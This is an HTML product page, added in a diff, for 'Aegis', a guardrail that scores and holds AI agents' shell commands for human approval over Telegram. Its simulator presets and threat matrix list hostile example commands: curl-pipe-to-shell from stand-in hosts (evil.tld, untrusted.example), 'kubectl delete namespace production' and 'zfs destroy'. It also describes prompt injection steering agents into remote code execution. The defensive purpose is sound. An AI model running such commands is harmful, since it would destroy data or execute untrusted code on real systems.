@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aegis (defense-in-depth) v1.4.0 — Shell AST &amp; Telegram HITL Runtime Guardrail | FlowAxon</title>
+  <meta name="description" content="Zero accidental blast radius for autonomous SRE and AI shell execution. 3-Layer Defense-in-Depth: L1 Shell AST Risk Scoring, L2 HMAC-SHA256 Signed Telegram HITL Approval Cards, and L3 Pre-Commit Zero-Leakage DLP.">
+  <link rel="canonical" href="https://aegis.flowaxon.com/">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="stylesheet" href="/assets/css/flowaxon.css?v=2.0.3" integrity="sha384-Z1ag+gO8Ce+XjnTaKyOMWdcSuZ3YIzx3Ljmi2zvEsChM/P5cRf4SnEM8noZcNmR8" crossorigin="anonymous">
+  <script src="/assets/js/flowaxon.js?v=2.0.2" integrity="sha384-NUShXKghksb2B3X8APyrTZF/x7Y64I3lUdPyOCkiP6tsarRwrrJdthIv3QZGNUwA" crossorigin="anonymous" defer></script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "Aegis (defense-in-depth)",
+    "applicationCategory": "SecurityApplication",
+    "operatingSystem": "Linux, macOS",
+    "softwareVersion": "1.4.0",
+    "author": { "@type": "Person", "name": "Le Duc Tam", "alternateName": "tamld" },
+    "url": "https://aegis.flowaxon.com/",
+    "codeRepository": "https://github.com/tamld/defense-in-depth",
+    "description": "3-Layer AI Execution Guardrail combining Shell AST Risk Scoring, HMAC-SHA256 Telegram HITL 2-Factor Approval Cards, and Pre-Commit Zero-Leakage DLP."
+  }
+  </script>
+</head>
+<body class="theme-aegis font-sans antialiased min-h-screen">
+
+  <!-- GLOBAL ECOSYSTEM TOPBAR -->
+  <header class="topbar" role="banner">
+    <div class="flex flex-wrap items-center gap-3">
+      <a href="https://flowaxon.com" class="flex items-center gap-2 font-mono text-sm text-zinc-100 hover:text-white">
+        <span class="w-2 h-2 rounded-full bg-rose-400 inline-block"></span>
+        <span class="font-bold">aegis</span>
+        <span class="text-zinc-500">/</span>
+        <span class="text-rose-400 text-xs">v1.4.0</span>
+      </a>
+      <nav class="topbar-nav" aria-label="FlowAxon Product Constellation">
+        <a href="https://flowaxon.com" class="topbar-link">← flowaxon.com (Hub)</a>
+        <a href="https://g8s.flowaxon.com" class="topbar-link">g8s.flowaxon.com ↗</a>
+        <a href="https://aegis.flowaxon.com" class="topbar-link active" aria-current="page">aegis.flowaxon.com</a>
+      </nav>
+    </div>
+    <div class="topbar-status" aria-live="polite">
+      <div class="hidden sm:flex items-center gap-3 text-xs font-mono text-zinc-400">
+        <a href="#personas" class="hover:text-white">Target Personas</a>
+        <a href="#defense-layers" class="hover:text-white">3-Layer Shield</a>
+        <a href="#playground" class="hover:text-white">AST &amp; Telegram Simulator</a>
+        <a href="#threat-matrix" class="hover:text-white">Threat Matrix</a>
+      </div>
+      <span id="sse-status-text" class="sse-pill">SSE LIVE</span>
+      <span id="sse-mem" class="sse-metric"></span>
+      <span id="sse-uptime" class="sse-metric"></span>
+    </div>
+  </header>
+
+  <main class="max-w-6xl mx-auto px-4 sm:px-8 py-8 sm:py-12 space-y-16">
+
+    <!-- 1. TACTICAL SECOPS HERO + ACTIVE PERIMETER RADAR -->
+    <section class="grid lg:grid-cols-12 gap-8 items-start">
+      <div class="lg:col-span-7 space-y-6">
+        <div class="inline-flex flex-wrap items-center gap-2 px-3 py-1 rounded bg-[#240c14] border border-[#4d1326] font-mono text-xs text-rose-400">
+          <span>RELEASE v1.4.0</span>
+          <span class="text-zinc-500">•</span>
+          <span>AST SHELL FIREWALL</span>
+          <span class="text-zinc-500">•</span>
+          <span>HMAC-SHA256 TELEGRAM HITL</span>
+        </div>
+
+        <div class="space-y-3">
+          <h1 class="text-2xl sm:text-4xl font-bold tracking-tight text-white">
+            Aegis (defense-in-depth) — Runtime Guardrail for Autonomous SRE &amp; AI Agents
+          </h1>
+          <p class="text-base sm:text-lg text-zinc-200 leading-relaxed">
+            <span class="text-rose-400 font-semibold">Zero accidental blast radius on production infrastructure.</span>
+            When AI agents are granted shell, SSH, or <code class="text-amber-400">kubectl</code> execution rights, a single hallucinated flag or indirect prompt injection can destroy stateful workloads. Aegis intercepts every command across 3 deterministic physical layers.
+          </p>
+        </div>
+
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-2.5 font-mono">
+          <div class="p-3 rounded bg-panel border border-borderSubtle">
+            <div class="text-lg sm:text-xl font-bold text-signalGreen">0 Outages</div>
+            <div class="text-[11px] text-zinc-400">Destructive Ops Blocked</div>
+          </div>
+          <div class="p-3 rounded bg-panel border border-borderSubtle">
+            <div class="text-lg sm:text-xl font-bold text-amber-400">&lt; 5ms</div>
+            <div class="text-[11px] text-zinc-400">Shell AST Risk Parse</div>
+          </div>
+          <div class="p-3 rounded bg-panel border border-borderSubtle">
+            <div class="text-lg sm:text-xl font-bold text-rose-400">HMAC-256</div>
+            <div class="text-[11px] text-zinc-400">Signed 2FA Callbacks</div>
+          </div>
+          <div class="p-3 rounded bg-panel border border-borderSubtle">
+            <div class="text-lg sm:text-xl font-bold text-accentLight">8 Gates</div>
+            <div class="text-[11px] text-zinc-400">Pre-Commit DLP Lock</div>
+          </div>
+        </div>
+
+        <div class="flex flex-wrap items-center gap-3 font-mono text-xs pt-1">
+          <a href="#playground" class="px-4 py-2 rounded bg-[#fb7185] text-zinc-950 font-bold hover:bg-white transition-colors">
+            🛡️ Launch AST &amp; Telegram HITL Simulator
+          </a>
+          <a href="https://github.com/tamld/defense-in-depth" target="_blank" rel="noopener noreferrer" class="px-4 py-2 rounded bg-panel border border-borderSubtle text-zinc-200 hover:text-white hover:border-rose-400 transition-colors">
+            github.com/tamld/defense-in-depth ↗
+          </a>
+        </div>
+      </div>
+
+      <!-- Right Column: Live 3-Layer Defense Perimeter Radar -->
+      <div class="lg:col-span-5 rounded-lg bg-panel border border-borderSubtle overflow-hidden font-mono text-xs">
+        <div class="px-3.5 py-2 bg-black border-b border-borderHairline flex items-center justify-between text-zinc-400">
+          <span>aegis-soc-radar — runtime enforcement</span>
+          <span class="text-rose-400 font-bold">● ARMED</span>
+        </div>
+        <div class="p-4 space-y-3 text-[11px]">
+          <div class="p-3 rounded bg-black border border-amber-500/30 space-y-1">
+            <div class="flex items-center justify-between">
+              <span class="text-amber-400 font-bold">LAYER 1: SHELL AST TOKENIZER</span>
+              <span class="text-signalGreen">ACTIVE</span>
+            </div>
+            <div class="text-zinc-400">Parses command verbs, flags, pipes, and subshells into AST nodes. Scores risk <code class="text-zinc-200">0..100</code> before process spawn.</div>
+          </div>
+
+          <div class="p-3 rounded bg-black border border-[#4d1326] space-y-1">
+            <div class="flex items-center justify-between">
+              <span class="text-rose-400 font-bold">LAYER 2: TELEGRAM HITL 2FA GATE</span>
+              <span class="text-rose-400">ENFORCING (SCORE ≥ 70)</span>
+            </div>
+            <div class="text-zinc-400">Freezes process group (<code class="text-zinc-200">SIGSTOP</code>) and dispatches an <code class="text-zinc-200">HMAC-SHA256</code> signed approval card to Operator's Telegram.</div>
+          </div>
+
+          <div class="p-3 rounded bg-black border border-emerald-500/30 space-y-1">
+            <div class="flex items-center justify-between">
+              <span class="text-signalGreen font-bold">LAYER 3: ZERO-LEAKAGE DLP &amp; AUDIT</span>
+              <span class="text-signalGreen">100% LOCKED</span>
+            </div>
+            <div class="text-zinc-400">Scans staged diffs for RFC1918 IPs, internal hostnames, API keys, and streams immutable audit logs to VictoriaLogs.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. TARGET AUDIENCE, READER & CONSUMER PERSONAS -->
+    <section id="personas" class="space-y-4">
+      <div class="border-b border-borderHairline pb-3 flex flex-col sm:flex-row sm:items-end justify-between gap-2">
+        <div>
+          <div class="text-[11px] font-mono uppercase tracking-wider text-rose-400">Target Personas &amp; Operational Scenarios</div>
+          <h2 class="text-xl sm:text-2xl font-bold text-white">Who Relies on Aegis Defense-in-Depth?</h2>
+        </div>
+        <span class="text-xs font-mono text-zinc-400">Deterministic Code Over Probabilistic Prompts</span>
+      </div>
+
+      <div class="persona-grid">
+        <article class="persona-card space-y-2.5">
+          <div class="flex items-center justify-between font-mono text-xs">
+            <span class="px-2 py-0.5 rounded bg-[#240c14] border border-[#4d1326] text-rose-400 font-semibold">1. Autonomous SREs &amp; Infra Ops</span>
+            <span class="text-zinc-500">Operator</span>
+          </div>
+          <h3 class="text-base font-bold text-white">Physical Brake on Destructive CLI Commands</h3>
+          <p class="text-xs text-zinc-300 leading-relaxed">
+            Allow AI troubleshooting agents to inspect logs, run <code class="text-signalGreen">pct status</code>, or query VictoriaLogs freely — while physically freezing high-blast-radius mutations (<code class="text-rose-400">kubectl delete</code>, <code class="text-rose-400">zfs destroy</code>, firewall edits) until you tap Approve on your phone.
+          </p>
+          <div class="pt-2 border-t border-borderHairline font-mono text-[11px] text-rose-400">
+            ✓ Outcome: Autonomous speed for read/triage; human sovereignty for mutations.
+          </div>
+        </article>
+
+        <article class="persona-card space-y-2.5">
+          <div class="flex items-center justify-between font-mono text-xs">
+            <span class="px-2 py-0.5 rounded bg-[#241705] border border-amber-500/30 text-amber-400 font-semibold">2. SecOps &amp; AppSec Engineers</span>
+            <span class="text-zinc-500">Defender</span>
+          </div>
+          <h3 class="text-base font-bold text-white">Defeat Indirect Prompt Injection to RCE</h3>
+          <p class="text-xs text-zinc-300 leading-relaxed">
+            When an agent reads untrusted web pages, logs, or GitHub issues containing hidden shell payloads (<code class="text-amber-400">curl ... | sh</code>, base64 exfiltration), Aegis L1 AST analysis catches chained pipes and subshells before execution.
+          </p>
+          <div class="pt-2 border-t border-borderHairline font-mono text-[11px] text-amber-400">
+            ✓ Outcome: Zero blind execution of untrusted remote payloads.
+          </div>
+        </article>
+
+        <article class="persona-card space-y-2.5">
+          <div class="flex items-center justify-between font-mono text-xs">
+            <span class="px-2 py-0.5 rounded bg-[#091f15] border border-emerald-500/30 text-signalGreen font-semibold">3. Compliance &amp; Public Open-Source Teams</span>
+            <span class="text-zinc-500">Auditor</span>
+          </div>
+          <h3 class="text-base font-bold text-white">Cryptographic Non-Repudiation &amp; Zero-Leakage DLP</h3>
+          <p class="text-xs text-zinc-300 leading-relaxed">
+            Every HITL callback is signed with <code class="text-signalGreen">HMAC-SHA256</code> (timestamp + nonce + command hash) to prevent replay attacks, and every git commit passes 8 deterministic DLP gates blocking private IPs and secrets.
+          </p>
+          <div class="pt-2 border-t border-borderHairline font-mono text-[11px] text-signalGreen">
+            ✓ Outcome: 100% sanitized public commits &amp; tamper-evident audit logs.
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 3. VISUAL ARCHITECTURE ASSET: 3-LAYER DEFENSE PIPELINE -->
+    <section id="defense-layers" class="p-5 sm:p-6 rounded-lg bg-panel border border-borderSubtle space-y-4">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-borderHairline pb-3">
+        <div>
+          <div class="text-[11px] font-mono uppercase tracking-wider text-rose-400">Dedicated Architecture Blueprint • 3-Layer Defense-in-Depth</div>
+          <h2 class="text-lg sm:text-xl font-bold text-white">How Aegis Intercepts, Scores, and Governs Agent Execution</h2>
+        </div>
+        <a href="/assets/diagrams/aegis-defense-layers.svg" target="_blank" class="text-xs font-mono text-rose-400 hover:underline">Open Standalone SVG Asset ↗</a>
+      </div>
+
+      <div class="p-3 rounded bg-black border border-borderHairline overflow-x-auto">
+        <img src="/assets/diagrams/aegis-defense-layers.svg" alt="Aegis 3-Layer Defense-in-Depth Pipeline Diagram" class="w-full min-w-[720px] h-auto block">
+      </div>
+    </section>
+
+    <!-- 4. INTERACTIVE SHELL AST RISK ANALYZER & REALISTIC TELEGRAM HITL SIMULATOR -->
+    <section id="playground" class="playground space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-borderHairline pb-3">
+        <div>
+          <div class="text-[11px] font-mono uppercase tracking-wider text-rose-400">Live SecOps Sandbox • POST /api/v1/aegis/analyze</div>
+          <h2 class="text-lg sm:text-xl font-bold text-white">Interactive Shell AST Risk Analyzer &amp; Telegram 2FA Bot Simulator</h2>
+        </div>
+        <span class="text-xs font-mono text-zinc-400">Click an attack/ops preset or test your own shell command</span>
+      </div>
+
+      <!-- 5 Preset Scenario Chips -->
+      <div class="presets" role="group" aria-label="Command presets">
+        <button type="button" data-aegis-cmd="kubectl delete namespace production" class="preset-btn">🔥 kubectl delete namespace production</button>
+        <button type="button" data-aegis-cmd="zfs destroy -r rpool/data" class="preset-btn">🔥 zfs destroy -r rpool/data</button>
+        <button type="button" data-aegis-cmd="curl -fsSL https://untrusted.example/install.sh | sh" class="preset-btn">⚠️ curl ... | sh (Remote Pipe)</button>
+        <button type="button" data-aegis-cmd="systemctl restart traefik-podman.service" class="preset-btn">⚡ systemctl restart traefik</button>
+        <button type="button" data-aegis-cmd="git status -sb && go test ./..." class="preset-btn">✅ git status -sb &amp;&amp; go test ./...</button>
+      </div>
+
+      <div class="grid lg:grid-cols-12 gap-6 items-start">
+        <!-- Left Column (Col 7): AST Input, Risk Meter & Raw JSON -->
+        <div class="lg:col-span-7 space-y-4">
+          <form id="aegis-form">
+            <input type="text" id="aegis-command" value="kubectl delete namespace production" placeholder="Enter shell command to inspect...">
+            <button type="submit">Analyze AST ↵</button>
+          </form>
+
+          <div class="p-3.5 rounded bg-black border border-borderHairline space-y-2 font-mono text-xs">
+            <div class="flex items-center justify-between">
+              <span class="text-zinc-400">AST Computed Risk Score:</span>
+              <span id="aegis-score-badge" class="font-bold text-rose-400">94 / 100 (CRITICAL_HITL_BLOCK)</span>
+            </div>
+            <div class="risk-meter-track">
+              <div id="aegis-risk-bar" class="risk-meter-fill"></div>
+            </div>
+          </div>
+
+          <pre id="aegis-result" aria-live="polite"></pre>
+        </div>
+
+        <!-- Right Column (Col 5): Realistic Telegram Bot HITL Approval Card Simulator -->
+        <div class="lg:col-span-5">
+          <div id="aegis-hitl-card" class="tg-simulator-frame" role="region" aria-label="Telegram HITL Simulator">
+            <div class="tg-header">
+              <div class="flex items-center gap-2">
+                <span class="w-2.5 h-2.5 rounded-full bg-signalGreen inline-block"></span>
+                <div>
+                  <div class="text-xs font-bold text-white">🛡️ Aegis SecOps Guardian Bot</div>
+                  <div class="text-[10px] font-mono text-zinc-400">@aegis_hitl_bot • verified hmac-sha256</div>
+                </div>
+              </div>
+              <span id="aegis-tg-badge" class="px-2 py-0.5 rounded bg-[#3b0c19] border border-rose-400 text-rose-400 font-mono text-[10px]">HITL REQUIRED</span>
+            </div>
+
+            <div class="tg-bubble space-y-2 font-mono text-[11px]">
+              <div class="text-rose-400 font-bold">🚨 HIGH-RISK AGENT COMMAND INTERCEPTED</div>
+              <div><span class="text-zinc-400">Target Node:</span> <span class="text-white">pve-node-01 (worktree sandbox)</span></div>
+              <div><span class="text-zinc-400">Command:</span> <code id="aegis-hitl-cmd" class="text-amber-300">kubectl delete namespace production</code></div>
+              <div><span class="text-zinc-400">Process State:</span> <span class="text-amber-400">FROZEN (SIGSTOP on PGID)</span></div>
+              <div><span class="text-zinc-400">HMAC-SHA256:</span> <span class="text-accentLight">sha256=9f8e2b4c...7a1d0e</span></div>
+            </div>
+
+            <div class="tg-inline-kb">
+              <button type="button" data-hitl-action="APPROVE" class="tg-kb-btn approve">✅ APPROVE ONCE</button>
+              <button type="button" data-hitl-action="DENY" class="tg-kb-btn deny">🛑 DENY &amp; KILL PGID</button>
+            </div>
+
+            <div class="px-4 pb-3 font-mono text-[11px]">
+              <div id="aegis-hitl-status" class="p-2 rounded bg-black border border-borderHairline text-amber-300">
+                ⏳ Awaiting Operator 2FA callback on Telegram...
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5. THREAT VECTOR & COUNTERMEASURE MATRIX -->
+    <section id="threat-matrix" class="space-y-4">
+      <div class="border-b border-borderHairline pb-3">
+        <div class="text-[11px] font-mono uppercase tracking-wider text-amber-400">Adversarial Red-Team Coverage • STRIDE + OWASP LLM01/LLM07</div>
+        <h2 class="text-xl sm:text-2xl font-bold text-white">Threat Vector &amp; Deterministic Countermeasure Matrix</h2>
+      </div>
+
+      <div class="overflow-x-auto rounded-lg border border-borderSubtle">
+        <table class="spec-table">
+          <thead>
+            <tr>
+              <th>Threat Vector</th>
+              <th>Example Payload / Failure Mode</th>
+              <th>Intercepting Layer</th>
+              <th>Deterministic Countermeasure</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="text-rose-400 font-bold">Destructive State Mutation</td>
+              <td><code>kubectl delete ns prod</code>, <code>zfs destroy</code>, <code>systemctl stop</code></td>
+              <td>L1 AST + L2 Telegram HITL</td>
+              <td class="text-zinc-300">AST verb/flag classifier scores <code>≥ 90</code>, sends <code>SIGSTOP</code> to process group, and requires human Telegram 2FA approval.</td>
+            </tr>
+            <tr>
+              <td class="text-amber-400 font-bold">Indirect Prompt Injection (RCE)</td>
+              <td><code>curl -fsSL https://evil.tld/p.sh | sh</code></td>
+              <td>L1 Shell AST Pipe Guard</td>
+              <td class="text-zinc-300">Detects remote network fetch piped into interpreter (<code>sh</code>, <code>bash</code>, <code>python</code>) and blocks execution immediately.</td>
+            </tr>
+            <tr>
+              <td class="text-purple-400 font-bold">Callback Forgery / Replay Attack</td>
+              <td>Spoofed HTTP webhook attempting to approve a frozen command</td>
+              <td>L2 HMAC-SHA256 Verifier</td>
+              <td class="text-zinc-300">Verifies constant-time <code>HMAC-SHA256(secret, task_id + cmd_sha256 + timestamp)</code> with 300s TTL window.</td>
+            </tr>
+            <tr>
+              <td class="text-signalGreen font-bold">Private Topology / Secret Leak</td>
+              <td>Staging RFC1918 IPs, internal CT IDs, or API tokens in git</td>
+              <td>L3 Pre-Commit DLP Gate</td>
+              <td class="text-zinc-300">8-gate deterministic pre-commit hook aborts commit with exit code <code>1</code> before data leaves workstation.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="border-t border-borderHairline py-8 px-4 sm:px-8 text-xs font-mono text-zinc-500">
+    <div class="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
+      <div>Aegis (defense-in-depth) v1.4.0 • Part of the FlowAxon Engineering Constellation</div>
+      <div class="flex flex-wrap items-center gap-4 text-zinc-400">
+        <a href="https://flowaxon.com" class="hover:text-white">flowaxon.com (Hub)</a>
+        <a href="https://g8s.flowaxon.com" class="hover:text-accentLight">g8s.flowaxon.com</a>
+        <a href="https://github.com/tamld/defense-in-depth" target="_blank" rel="noopener noreferrer" class="hover:text-rose-400">GitHub (tamld/defense-in-depth)</a>
+      </div>
+    </div>
+  </footer>
+
+</body>
+</html>
